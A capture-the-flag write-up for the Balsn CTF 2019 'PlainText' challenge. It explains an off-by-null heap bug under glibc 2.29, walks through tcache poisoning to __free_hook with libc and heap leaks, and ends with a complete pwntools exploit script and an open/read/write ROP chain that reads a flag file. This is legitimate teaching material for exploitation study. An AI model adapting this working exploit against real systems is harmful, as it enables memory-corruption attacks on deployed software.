## Example 3: Balsn_CTF_2019-PlainText
### Vulnerability Exploitation Analysis

The program flow is fairly clear and simple. In the add function, there is an obvious off-by-null.

![](./figure/add-function.png)

In the free function, the freed pointer is set to NULL, which prevents direct show. The program also appends `\x00` to the end of our input, making it impossible to use the free-then-reallocate method. Therefore, leaking is quite difficult.

Analysis complete. Now let's proceed with exploitation.

For debugging convenience, it is recommended to disable ASLR first.

At the beginning, the bins are very messy, so we first allocate out all this miscellaneous stuff:

```python
for i in range(16):
    add(0x10,'fill')

for i in range(16):
    add(0x60,'fill')

for i in range(9):
    add(0x70,'fill')

for i in range(5):
    add(0xC0,'fill')

for i in range(2):
    add(0xE0,'fill')

add(0x170,'fill')
add(0x190,'fill')
# 49
```

Since our partial overwrite will have a `\x00` appended, we need to adjust the heap address. For debugging convenience, I chose to adjust it like this — the specific reason will be explained shortly:

```python
add(0x2A50,'addralign') # 50
```

Then we perform the heap layout.

First, allocate a relatively large chunk, free it, then allocate an even larger chunk to push the freed chunk into the large bin:

```python
add(0xFF8,'large bin') # 51
add(0x18,'protect') # 52


delete(51)
add(0x2000,'push to large bin') # 51
```

Due to the heap address adjustment performed earlier, in my gdb, the lower 16 bits of this large bin's low address are all 0 (which is why the heap address was adjusted that way earlier. Of course, this only applies during debugging — in an actual exploit, only the lower 12 bits can be guaranteed to be zero, requiring a 4-bit brute force with a probability of 1/16).

Then we perform the following layout:

```python
add(0x28,p64(0) + p64(0x241) + '\x28') # 53 fd->bk : 0xA0 - 0x18

add(0x28,'pass-loss control') # 54
add(0xF8,'pass') # 55
add(0x28,'pass') # 56
add(0x28,'pass') # 57
add(0x28,'pass') # 58
add(0x28,'pass') # 59
add(0x28,'pass-loss control') # 60
add(0x4F8,'to be off-by-null') # 61
```

![](./figure/heap-setup.png)


The resulting layout looks like the figure above. Chunk A has completed the layout of the fake chunk's size and fd, bk pointers. The fd will point to `&chunk_B - 0x18` and corrupts the large bin's fd. We will later repair this fd and make it point to the fake chunk.

Since the fake chunk's fd points to `&chunk_B - 0x18`, we want chunk B's fd to point to the fake chunk. So we need to free it first and then reallocate it, then partially overwrite fd to achieve this.

The purpose of chunk E is to raise the heap address so that the full address can be output when leaking the heap address later.

Between chunk E and chunk C, there are some chunks that will be overlapped, which will be convenient for later exploitation. It's recommended to include more of them to avoid running out later.

Chunk C will be used in the future to off-by-null chunk D, and then when chunk D is freed, it will merge towards lower addresses.

---

The fake chunk's size has already been modified. We don't want to corrupt this size while repairing the large bin's fd, so chunk A must be freed into the fastbin. Chunk B and chunk C also need to be freed, and we want chunk B's fd pointer to point to a heap address so that a partial overwrite can make it point to fake_chunk.

```python
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(61 + 1 + i)

delete(54)
delete(60)
delete(53)

for i in range(7):
    add(0x28,'tcache')

# 53,54,60,62,63,64,65

add(0x28,'\x10') # 53->66
## stashed ##
add(0x28,'\x10') # 54->67
add(0x28,'a' * 0x20 + p64(0x240)) # 60->68
delete(61)
```

Here's the idea: first fill up the Tcache, then free chunk B, C, A in order. Then empty the Tcache, and reallocate chunk A with a partial overwrite to make fd point to fake_chunk.

Then, due to the Tcache's stash mechanism, chunks B and C enter the Tcache. The next allocation returns chunk B, which we partially overwrite to make fd point to fake_chunk.

Then we reallocate chunk C and perform the off-by-null.

Free chunk D, and chunk overlapping is successfully achieved.

Then we perform the leak. We need to leak both the heap address and the libc address. There are many ways to leak; here is one approach (this method is certainly not the best, but it gets the job done):

```
add(0x140,'pass') # 61
show(56)
libc_base = u64(sh.recv(6).ljust(0x8,'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60
log.success("libc_base:" + hex(libc_base))
__free_hook_addr = libc_base + libc.sym["__free_hook"]

add(0x28,'pass') # 69<-56
add(0x28,'pass') # 70<-57
delete(70)
delete(69)
show(56)
heap_base = u64(sh.recv(6).ljust(0x8,'\x00')) - 0x1A0
log.success("heap_base:" + hex(heap_base))
```

Then we perform Tcache poisoning (I got stuck here for a moment, mainly because I kept thinking about achieving it through double free — that idea is indeed pretty dumb. It's important to note that Tcache poisoning exploitation only requires controlling the next pointer. Double free is often a method to achieve that control, but it's not required. In this challenge, there's a better method, so double free isn't needed).

```
add(0x28,p64(0) * 2) # 69<-56
add(0x28,p64(0) * 2) # 70<-57
add(0x28,p64(0) * 2) # 71<-58
delete(68)
add(0x60,p64(0) * 5 + p64(0x31) + p64(__free_hook_addr)) # 68
add(0x28,'pass') # 72
## alloc to __free_hook ##
magic_gadget = libc_base + 0x12be97
add(0x28,p64(magic_gadget)) # 73
```

Because of chunk overlapping, controlling the next pointer is actually quite easy. For example, using the method above, we can allocate to __free_hook.

This concludes the heap exploitation part. After this, sandbox bypass is needed. The specific method is not elaborated here; please refer to the "C Sandbox Escape" section under the "Sandbox Escape" directory.

### exp

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal = ["tmux","splitw","-h"]
context.log_level = 'debug'

#sh = process("./note")
#libc = ELF("/glibc/2.29/64/lib/libc.so.6")
sh = process("./note-re")
libc = ELF("./libc-2.29.so")

def add(size,payload):
    sh.sendlineafter("Choice: ",'1')
    sh.sendlineafter("Size: ",str(size))
    sh.sendafter("Content: ",payload)

def delete(index):
    sh.sendlineafter("Choice: ",'2')
    sh.sendlineafter("Idx: ",str(index))

def show(index):
    sh.sendlineafter("Choice: ",'3')
    sh.sendlineafter("Idx: ",str(index))

for i in range(16):
    add(0x10,'fill')

for i in range(16):
    add(0x60,'fill')

for i in range(9):
    add(0x70,'fill')

for i in range(5):
    add(0xC0,'fill')

for i in range(2):
    add(0xE0,'fill')

add(0x170,'fill')
add(0x190,'fill')
# 49

add(0x2A50,'addralign') # 50
#add(0x4A50,'addralign') # 50

add(0xFF8,'large bin') # 51
add(0x18,'protect') # 52


delete(51)
add(0x2000,'push to large bin') # 51
add(0x28,p64(0) + p64(0x241) + '\x28') # 53 fd->bk : 0xA0 - 0x18

add(0x28,'pass-loss control') # 54
add(0xF8,'pass') # 55
add(0x28,'pass') # 56
add(0x28,'pass') # 57
add(0x28,'pass') # 58
add(0x28,'pass') # 59
add(0x28,'pass-loss control') # 60
add(0x4F8,'to be off-by-null') # 61

for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(61 + 1 + i)

delete(54)
delete(60)
delete(53)

for i in range(7):
    add(0x28,'tcache')

# 53,54,60,62,63,64,65

add(0x28,'\x10') # 53->66
## stashed ##
add(0x28,'\x10') # 54->67
add(0x28,'a' * 0x20 + p64(0x240)) # 60->68
delete(61)

add(0x140,'pass') # 61
show(56)
libc_base = u64(sh.recv(6).ljust(0x8,'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60
log.success("libc_base:" + hex(libc_base))
__free_hook_addr = libc_base + libc.sym["__free_hook"]

add(0x28,'pass') # 69<-56
add(0x28,'pass') # 70<-57
delete(70)
delete(69)
show(56)
heap_base = u64(sh.recv(6).ljust(0x8,'\x00')) - 0x1A0
log.success("heap_base:" + hex(heap_base))

add(0x28,p64(0) * 2) # 69<-56
add(0x28,p64(0) * 2) # 70<-57
add(0x28,p64(0) * 2) # 71<-58
delete(68)
add(0x60,p64(0) * 5 + p64(0x31) + p64(__free_hook_addr)) # 68
add(0x28,'pass') # 72
## alloc to __free_hook ##
magic_gadget = libc_base + 0x12be97
add(0x28,p64(magic_gadget)) # 73

pop_rdi_ret = libc_base + 0x26542
pop_rsi_ret = libc_base + 0x26f9e
pop_rdx_ret = libc_base + 0x12bda6
syscall_ret = libc_base + 0xcf6c5
pop_rax_ret = libc_base + 0x47cf8
ret = libc_base + 0xc18ff

payload_addr = heap_base + 0x270
str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
rw_addr = heap_base 

payload = p64(libc_base + 0x55E35) # rax
payload += p64(payload_addr - 0xA0 + 0x10) # rdx
payload += p64(payload_addr + 0x28)
payload += p64(ret)
payload += ''.ljust(0x8,'\x00')

rop_chain = ''
rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["read"])
rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["write"])

payload += rop_chain
payload += './flag\x00'
add(len(payload) + 0x10,payload) # 74
#gdb.attach(proc.pidof(sh)[0])
delete(74)

sh.interactive()
```
